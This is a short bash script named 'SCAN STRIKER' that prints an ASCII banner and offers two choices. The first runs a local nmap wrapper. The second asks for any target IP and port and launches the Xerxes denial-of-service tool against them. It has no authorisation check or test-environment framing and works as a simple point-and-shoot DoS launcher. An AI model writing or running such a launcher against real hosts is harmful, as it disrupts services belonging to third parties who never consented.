#!/bin/bash

# Clear the screen
clear

# Define the title
title="

███████╗ ██████╗ █████╗ ███╗   ██╗    ███████╗████████╗██████╗ ██╗██╗  ██╗███████╗██████╗ 
██╔════╝██╔════╝██╔══██╗████╗  ██║    ██╔════╝╚══██╔══╝██╔══██╗██║██║ ██╔╝██╔════╝██╔══██╗
███████╗██║     ███████║██╔██╗ ██║    ███████╗   ██║   ██████╔╝██║█████╔╝ █████╗  ██████╔╝
╚════██║██║     ██╔══██║██║╚██╗██║    ╚════██║   ██║   ██╔══██╗██║██╔═██╗ ██╔══╝  ██╔══██╗
███████║╚██████╗██║  ██║██║ ╚████║    ███████║   ██║   ██║  ██║██║██║  ██╗███████╗██║  ██║
╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝    ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
"

# Get the width of the terminal
terminal_width=$(tput cols)

# Calculate the starting position to center the title
start_position=$(( (terminal_width - ${#title}) / 2 ))

# Display the title centered
echo
echo "$title" | while IFS= read -r line; do
  printf "%*s\n" $(( (terminal_width + ${#line}) / 2 )) "$line"
done
echo

# Display the creator name with colorful outlines
echo -e "\e[41m\e[97m Created by Priyanshu \e[0m"
echo -e "\n"

# Prompt the user for scan or attack option
echo "Choose an option:"
echo "1) Network scan"  # Network scan option
echo "2) Attack"       # Attack option
read -p "Enter your choice (1, 2): " user_choice

# Give some space
echo -e "__________________________________________"
echo -e "\n"

if [ "$user_choice" == "1" ]; then
    # Run network scan script
    echo "Running network scan..."
    /home/priyanshu/MyTools/./nmaprun.sh

    echo "Network scan completed."
elif [ "$user_choice" == "2" ]; then
    # Prompt the user for target IP and port number for the attack
    read -p "Enter the target IP address: " target_ip
    read -p "Enter the target port number: " target_port

    # Running the attack (assuming the use of Xerxes for DOS attack)
    echo "Running attack on IP: $target_ip on port: $target_port..."
    /home/priyanshu/MyTools/XERXES/./xerxes $target_ip $target_port
    echo "Attack completed."
else
    echo "Invalid choice. Exiting..."
    exit 1
fi
